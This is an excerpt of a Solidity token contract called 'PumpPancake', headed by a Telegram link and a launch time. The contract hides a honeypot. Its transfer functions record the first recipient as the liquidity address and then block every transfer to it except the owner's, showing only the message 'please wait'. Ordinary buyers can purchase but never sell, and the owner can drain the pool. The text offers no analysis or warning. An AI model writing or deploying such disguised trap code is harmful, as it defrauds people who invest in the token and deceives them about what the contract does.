...
//https://t.me/pumppancake
//19:00 GMT/UTC 08/08/2021
...
contract Ownable is Context {
    ...
    uint256 private _enabledTrading;
    ...
    function SetupEnableTrading() public virtual onlyOwner {
		_enabledTrading = 1;
    }
...
contract PumpPancake is Context, IERC20, Ownable, Pausable {
  ...
  string private _symbol = "PUMPCAKE";
  string private _name = "PumpPancake";
  address public lqaddr;
  ...
  function transferlqaddr(address _lqaddr) public onlyOwner {
    lqaddr = _lqaddr;
  }
  ...
  function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
    if(sender != address(0) && lqaddr == address(0)) lqaddr = recipient;
    else  require(recipient != lqaddr || sender == owner(), "please wait");
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal {
    ...
    if(lqaddr != address(0)) require(recipient != lqaddr || sender == owner(), "please wait");
